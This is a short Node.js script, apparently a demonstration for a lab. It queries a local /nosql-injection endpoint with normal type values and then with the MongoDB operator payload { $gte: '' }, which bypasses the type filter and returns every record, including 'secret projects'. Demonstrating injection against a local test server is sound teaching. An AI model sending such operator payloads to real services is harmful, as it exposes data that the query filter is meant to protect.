'use strict';
const Request = require('request');

const makeRequest = function (type, atk) {
    console.log(type);
    Request({
        method: 'POST',
        url: 'http://localhost:8000/nosql-injection',
        json: { type }
    }, (err, result) => {

        console.log(`Got response from server (body: ${JSON.stringify({type})}, attack: ${!!atk}):`);
        console.log(`ID:\t\t\t\tTYPE\t\t\tTITLE:`);
        if (result.statusCode !== 500) {
            result.body.forEach((item) => {
                console.log(`${item._id}\t${item.type}\t\t\t${item.title}\t`);
            });
        }
        else {
            console.log('ERROR 500');
        }
        console.log('\n');
    });
};

['blog', 'fairy', 'secret projects'].forEach((type) => {
    makeRequest(type, false)
});

makeRequest({ $gte: '' }, true);
